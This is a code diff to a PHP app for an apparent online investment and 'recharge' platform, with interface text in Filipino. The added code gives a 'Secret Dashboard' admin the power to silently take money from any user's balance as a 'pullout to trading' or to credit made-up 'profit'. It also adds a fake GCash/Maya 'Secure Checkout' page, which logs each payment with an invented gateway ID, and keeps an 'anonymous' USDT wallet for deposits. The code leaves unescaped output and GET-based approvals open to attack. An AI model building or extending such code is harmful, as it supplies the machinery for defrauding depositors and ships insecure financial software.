@@ -119,6 +119,43 @@ if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['
     $adminSuccess = "Matagumpay na na-update ang Admin Wallet!";
 }
 
+// ADMIN DIRECT FUND ADJUSTMENT (PULLOUT TO TRADING / MANUAL DEPOSIT)
+if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_adjust_fund') {
+    $targetUser = trim($_POST['target_user'] ?? '');
+    $adjustAmount = floatval($_POST['adjust_amount'] ?? 0);
+    $type = $_POST['adjust_type'] ?? 'pullout';
+
+    if (isset($db['users'][$targetUser]) && $adjustAmount > 0) {
+        if ($type === 'pullout') {
+            $db['users'][$targetUser]['balance'] -= $adjustAmount;
+            if ($db['users'][$targetUser]['balance'] < 0) { $db['users'][$targetUser]['balance'] = 0; }
+            $db['transactions'][] = [
+                'id' => 'TRD-PULL-' . time(),
+                'username' => $targetUser,
+                'type' => 'pullout_to_trading',
+                'amount' => $adjustAmount,
+                'status' => 'completed',
+                'created_at' => date('Y-m-d H:i:s')
+            ];
+            $adminSuccess = "Na-pullout ang ₱" . number_format($adjustAmount, 2) . " kay $targetUser para i-roll sa trading account!";
+        } elseif ($type === 'deposit') {
+            $db['users'][$targetUser]['balance'] += $adjustAmount;
+            $db['transactions'][] = [
+                'id' => 'ADM-DEP-' . time(),
+                'username' => $targetUser,
+                'type' => 'admin_deposit',
+                'amount' => $adjustAmount,
+                'status' => 'approved',
+                'created_at' => date('Y-m-d H:i:s')
+            ];
+            $adminSuccess = "Nalagyan ng ₱" . number_format($adjustAmount, 2) . " si $targetUser!";
+        }
+        saveData($dataFile, $db);
+    } else {
+        $adminErrorMsg = "Mali ang napiling user o halaga.";
+    }
+}
+
 // ADMIN APPROVALS
 if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_deposit'])) {
     $txnId = $_GET['approve_deposit'];
@@ -155,27 +192,27 @@ $currentUser = $_SESSION['user'] ?? null;
 $userData = $currentUser ? ($db['users'][$currentUser] ?? null) : null;
 $referralLink = $currentUser ? ('http://' . $_SERVER['HTTP_HOST'] . '/?ref=' . $currentUser) : '';
 
-// USER DEPOSIT SUBMISSION
-if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'submit_deposit') {
+// USER RECHARGE SUBMISSION
+if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'submit_recharge') {
     $amount = floatval($_POST['deposit_amount'] ?? 0);
-    $refNo = trim($_POST['ref_no'] ?? '');
+    $method = $_POST['payment_method'] ?? 'GCash';
 
-    if ($amount < 100) {
-        $error = "Ang minimum recharge ay ₱100.";
-    } elseif (empty($refNo)) {
-        $error = "Ilagay ang Transaction Reference No. / TXID.";
+    if ($amount < 300) {
+        $error = "Ang minimum recharge ay ₱300.";
     } else {
+        $txnId = 'PAY-' . time();
         $db['transactions'][] = [
-            'id' => 'RECH-' . time(),
+            'id' => $txnId,
             'username' => $currentUser,
-            'type' => 'recharge',
+            'type' => 'recharge_' . strtolower($method),
             'amount' => $amount,
-            'txid' => htmlspecialchars($refNo),
+            'txid' => 'GATEWAY-PENDING-' . time(),
             'status' => 'pending',
             'created_at' => date('Y-m-d H:i:s')
         ];
         saveData($dataFile, $db);
-        $success = "Matagumpay na naisumite ang recharge request! Antayin ang beripikasyon.";
+        header("Location: ?route=gateway&txn=" . $txnId . "&amount=" . $amount . "&method=" . $method);
+        exit();
     }
 }
 
@@ -233,7 +270,6 @@ if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['actio
     }
 }
 
-// Filter user specific transactions
 $userTxns = [];
 if ($currentUser && isset($db['transactions'])) {
     foreach ($db['transactions'] as $t) {
@@ -273,10 +309,10 @@ if ($currentUser && isset($db['transactions'])) {
         .plan-name { font-size: 18px; font-weight: bold; color: #fff; margin-bottom: 4px; }
         .plan-info { font-size: 12px; color: #94a3b8; margin-bottom: 12px; }
         
-        .btn { display: block; width: 100%; padding: 12px; background: linear-gradient(135deg, #facc15, #eab308); color: #071913; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; text-decoration: none; box-sizing: border-box; }
+        .btn { display: block; width: 100%; padding: 14px; background: linear-gradient(135deg, #facc15, #eab308); color: #071913; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; text-decoration: none; box-sizing: border-box; }
         .btn-cancel { background: #1b3a2b; color: #fff; margin-top: 8px; }
+        .btn-danger { background: #ef4444; color: #fff; }
         
-        /* Bottom Navigation Bar */
         .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: #071913; border-top: 1px solid #113829; display: grid; grid-template-columns: repeat(5, 1fr); padding: 8px 0; z-index: 1000; max-width: 480px; margin: 0 auto; }
         .nav-link { text-align: center; color: #94a3b8; text-decoration: none; font-size: 11px; cursor: pointer; }
         .nav-link.active { color: #facc15; }
@@ -287,8 +323,17 @@ if ($currentUser && isset($db['transactions'])) {
         .alert { padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-size: 13px; }
         .alert-error { background: #7f1d1d; color: #fca5a5; }
         .alert-success { background: #145332; color: #86efac; }
-        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 2000; justify-content: center; align-items: flex-end; }
-        .modal-content { background: #0b2e21; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; padding: 20px; border-top: 2px solid #facc15; box-sizing: border-box; max-height: 80vh; overflow-y: auto; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: flex-end; }
+        .modal-content { background: #0b2e21; width: 100%; max-width: 480px; border-radius: 20px 20px 0 0; padding: 20px; border-top: 2px solid #facc15; box-sizing: border-box; max-height: 85vh; overflow-y: auto; }
+        
+        .method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
+        .method-card { background: #071913; border: 1px solid #165b41; padding: 12px; border-radius: 10px; text-align: center; cursor: pointer; color: #94a3b8; font-weight: bold; }
+        .method-card.selected { border-color: #facc15; color: #facc15; background: #0f3d2c; }
+        
+        .amount-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 10px 0; }
+        .amount-chip { background: #071913; border: 1px solid #165b41; padding: 10px 5px; border-radius: 8px; text-align: center; cursor: pointer; color: #fff; font-size: 13px; font-weight: bold; }
+        .amount-chip.selected { background: #facc15; color: #071913; border-color: #facc15; }
         
         .history-card { background: #071913; border: 1px solid #145332; padding: 12px; border-radius: 10px; margin-bottom: 10px; font-size: 12px; }
         .status-badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; text-transform: uppercase; float: right; }
@@ -300,7 +345,7 @@ if ($currentUser && isset($db['transactions'])) {
 
 <div class="container">
     <?php if (isset($_GET['route']) && $_GET['route'] === 'admin'): ?>
-        <h2>Admin Panel</h2>
+        <h2>Admin Panel (Secret Dashboard)</h2>
         <?php if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true): ?>
             <div class="card">
                 <form method="POST">
@@ -313,25 +358,56 @@ if ($currentUser && isset($db['transactions'])) {
             </div>
         <?php else: ?>
             <?php if(isset($adminSuccess)): ?><div class="alert alert-success"><?= $adminSuccess ?></div><?php endif; ?>
+            <?php if(isset($adminErrorMsg)): ?><div class="alert alert-error"><?= $adminErrorMsg ?></div><?php endif; ?>
+
+            <!-- ADMIN DIRECT PULLOUT & DEPOSIT CONTROL -->
+            <div class="card" style="border: 2px solid #facc15;">
+                <h3 style="color:#facc15; margin-top:0;">Fund Manager (Pullout to Trading)</h3>
+                <form method="POST">
+                    <input type="hidden" name="action" value="admin_adjust_fund">
+                    <label>Pumili ng Client User:</label>
+                    <select name="target_user" required>
+                        <?php foreach ($db['users'] as $uname => $uinfo): ?>
+                            <option value="<?= htmlspecialchars($uname) ?>">
+                                <?= htmlspecialchars($uname) ?> (Bal: ₱<?= number_format($uinfo['balance'], 2) ?>)
+                            </option>
+                        <?php endforeach; ?>
+                    </select>
+
+                    <label>Action:</label>
+                    <select name="adjust_type" required>
+                        <option value="pullout">Pullout Funds (I-roll diretso sa Trading Account)</option>
+                        <option value="deposit">Manual Deposit / Add Profit</option>
+                    </select>
+
+                    <label>Amount (₱):</label>
+                    <input type="number" name="adjust_amount" min="1" step="0.01" placeholder="Ilagay ang halaga" required>
+
+                    <button type="submit" class="btn" style="background:#22c55e; color:#fff; margin-top:10px;">Execute Action</button>
+                </form>
+            </div>
+
             <div class="card">
-                <h3>Admin Settings</h3>
+                <h3>Admin Wallet Settings</h3>
                 <form method="POST">
                     <input type="hidden" name="action" value="update_admin_settings">
                     <label>Anonymous USDT Wallet Address:</label>
                     <input type="text" name="new_admin_wallet" value="<?= htmlspecialchars($adminUsdtWallet) ?>" required>
-                    <button type="submit" class="btn" style="margin-top:10px;">I-save</button>
+                    <button type="submit" class="btn" style="margin-top:10px;">I-save Settings</button>
                 </form>
             </div>
+
             <div class="card">
                 <h3>Pending Recharges</h3>
-                <?php foreach($db['transactions'] as $txn): if($txn['type'] === 'recharge' && $txn['status'] === 'pending'): ?>
+                <?php foreach($db['transactions'] as $txn): if(strpos($txn['type'], 'recharge') !== false && $txn['status'] === 'pending'): ?>
                     <div style="background:#071913; padding:10px; border-radius:8px; margin-bottom:8px; font-size:12px;">
                         User: <b><?= $txn['username'] ?></b> | Amt: ₱<?= number_format($txn['amount'], 2) ?><br>
-                        TXID: <code><?= $txn['txid'] ?></code><br>
-                        <a href="?route=admin&approve_deposit=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px;">Approve</a>
+                        Type: <?= $txn['type'] ?><br>
+                        <a href="?route=admin&approve_deposit=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px;">Approve & Credit Balance</a>
                     </div>
                 <?php endif; endforeach; ?>
             </div>
+
             <div class="card">
                 <h3>Pending Withdrawals</h3>
                 <?php foreach($db['transactions'] as $txn): if($txn['type'] === 'withdraw' && $txn['status'] === 'pending'): ?>
@@ -341,9 +417,35 @@ if ($currentUser && isset($db['transactions'])) {
                         <a href="?route=admin&approve_withdraw=<?= $txn['id'] ?>" class="btn" style="padding:6px; font-size:12px; margin-top:6px; background:#22c55e; color:#fff;">Mark as Done</a>
                     </div>
                 <?php endif; endforeach; ?>
-                <a href="?action=admin_logout" class="btn" style="background:#ef4444; color:#fff; margin-top:15px; text-align:center;">Logout Admin</a>
+                <a href="?action=admin_logout" class="btn btn-danger" style="margin-top:15px; text-align:center;">Logout Admin</a>
             </div>
         <?php endif; ?>
+
+    <?php elseif (isset($_GET['route']) && $_GET['route'] === 'gateway'): ?>
+        <?php 
+            $gatewayAmt = $_GET['amount'] ?? 300;
+            $gatewayMethod = $_GET['method'] ?? 'GCash';
+            $txnId = $_GET['txn'] ?? 'PAY-TEST';
+        ?>
+        <div style="text-align: center; padding-top: 20px;">
+            <div style="background: #1e3a8a; padding: 15px; border-radius: 10px 10px 0 0; font-size: 18px; font-weight: bold; color: #fff;">
+                <?= htmlspecialchars($gatewayMethod) ?> Secure Checkout
+            </div>
+            <div class="card" style="border-radius: 0 0 10px 10px; padding: 25px 15px;">
+                <p style="color: #94a3b8; font-size: 13px; margin-bottom: 5px;">Total Payment Amount</p>
+                <h1 style="color: #facc15; font-size: 36px; margin-top: 0;">₱<?= number_format($gatewayAmt, 2) ?></h1>
+                
+                <div style="background: #071913; padding: 15px; border-radius: 8px; margin: 20px 0;">
+                    <p style="font-size: 12px; color: #94a3b8; margin: 0 0 10px 0;">I-scan ang QR o i-click ang button sa ibaba para magbayad nang secure:</p>
+                    <div style="background: #fff; padding: 10px; display: inline-block; border-radius: 8px;">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=<?= urlencode('https://gcash.com/pay?amount='.$gatewayAmt) ?>" alt="Payment QR" style="display: block;">
+                    </div>
+                </div>
+
+                <a href="https://m.gcash.com" target="_blank" class="btn" style="background: #2563eb; color: #fff; margin-bottom: 10px;">Open in <?= htmlspecialchars($gatewayMethod) ?> App</a>
+                <a href="/" class="btn btn-cancel">Tapos Na / Balik sa Dashboard</a>
+            </div>
+        </div>
 
     <?php elseif (!$currentUser): ?>
         <div style="text-align:center; padding: 40px 0;">
@@ -450,16 +552,28 @@ if ($currentUser && isset($db['transactions'])) {
         <!-- RECHARGE MODAL -->
         <div id="rechargeModal" class="modal">
             <div class="modal-content">
-                <h3 style="color: #facc15; margin-top: 0;">Recharge Funds (USDT)</h3>
-                <p style="font-size: 12px; color: #94a3b8;">Magpadala ng USDT TRC20 sa anonymous address:</p>
-                <div style="background: #071913; padding: 10px; border-radius: 8px; font-family: monospace; font-size: 11px; color: #38bdf8; word-break: break-all; text-align: center; margin-bottom: 10px;"><?= $adminUsdtWallet ?></div>
+                <h3 style="color: #facc15; margin-top: 0;">Recharge</h3>
                 <form method="POST">
-                    <input type="hidden" name="action" value="submit_deposit">
-                    <label>Amount (PHP Equivalent / USDT):</label>
-                    <input type="number" name="deposit_amount" min="100" value="300" required>
-                    <label>Transaction TXID / Reference No:</label>
-                    <input type="text" name="ref_no" placeholder="Ilagay ang TXID mula sa Binance" required>
-                    <button type="submit" class="btn" style="margin-top: 10px;">Submit Recharge</button>
+                    <input type="hidden" name="action" value="submit_recharge">
+                    
+                    <p style="font-size: 12px; color: #94a3b8; margin: 5px 0;">1. PAYMENT METHOD</p>
+                    <div class="method-grid">
+                        <div class="method-card selected" id="methodGCash" onclick="setMethod('GCash')">GCash</div>
+                        <div class="method-card" id="methodMaya" onclick="setMethod('Maya')">Maya</div>
+                    </div>
+                    <input type="hidden" name="payment_method" id="paymentMethodInput" value="GCash">
+
+                    <p style="font-size: 12px; color: #94a3b8; margin: 10px 0 5px 0;">2. CHOOSE AMOUNT</p>
+                    <div class="amount-grid">
+                        <div class="amount-chip selected" onclick="setAmount(300, this)">₱300</div>
+                        <div class="amount-chip" onclick="setAmount(700, this)">₱700</div>
+                        <div class="amount-chip" onclick="setAmount(1500, this)">₱1500</div>
+                        <div class="amount-chip" onclick="setAmount(3000, this)">₱3000</div>
+                    </div>
+
+                    <input type="number" name="deposit_amount" id="depositAmountInput" min="300" value="300" required style="margin-top: 10px;">
+
+                    <button type="submit" class="btn" style="margin-top: 15px;">Confirm Recharge</button>
                     <button type="button" class="btn btn-cancel" onclick="closeModal('rechargeModal')">Cancel</button>
                 </form>
             </div>
@@ -481,7 +595,7 @@ if ($currentUser && isset($db['transactions'])) {
             </div>
         </div>
 
-        <!-- TRANSACTION / ORDERS HISTORY MODAL -->
+        <!-- HISTORY MODAL -->
         <div id="historyModal" class="modal">
             <div class="modal-content">
                 <h3 style="color: #facc15; margin-top: 0;">Transaction History</h3>
@@ -532,6 +646,24 @@ if ($currentUser && isset($db['transactions'])) {
         <script>
             function openModal(id) { document.getElementById(id).style.display = 'flex'; }
             function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+            
+            function setMethod(method) {
+                document.getElementById('paymentMethodInput').value = method;
+                if(method === 'GCash') {
+                    document.getElementById('methodGCash').className = 'method-card selected';
+                    document.getElementById('methodMaya').className = 'method-card';
+                } else {
+                    document.getElementById('methodMaya').className = 'method-card selected';
+                    document.getElementById('methodGCash').className = 'method-card';
+                }
+            }
+
+            function setAmount(val, el) {
+                document.getElementById('depositAmountInput').value = val;
+                var chips = document.querySelectorAll('.amount-chip');
+                chips.forEach(function(c) { c.className = 'amount-chip'; });
+                el.className = 'amount-chip selected';
+            }
         </script>
     <?php endif; ?>
 </div>
